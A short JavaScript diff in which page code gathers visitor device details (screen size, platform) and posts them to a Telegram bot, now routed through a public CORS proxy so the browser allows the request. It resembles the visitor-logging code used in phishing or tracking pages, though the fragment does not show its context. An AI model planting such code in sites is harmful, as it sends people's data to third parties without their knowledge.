@@ -17,7 +17,10 @@
         text += 'Screen: ' + screen.width + 'x' + screen.height + '\n';
         text += 'Platform: ' + navigator.platform;
         
-        fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
+        var apiUrl = 'https://api.telegram.org/bot' + BOT + '/sendMessage';
+        var proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(apiUrl);
+        
+        fetch(proxyUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
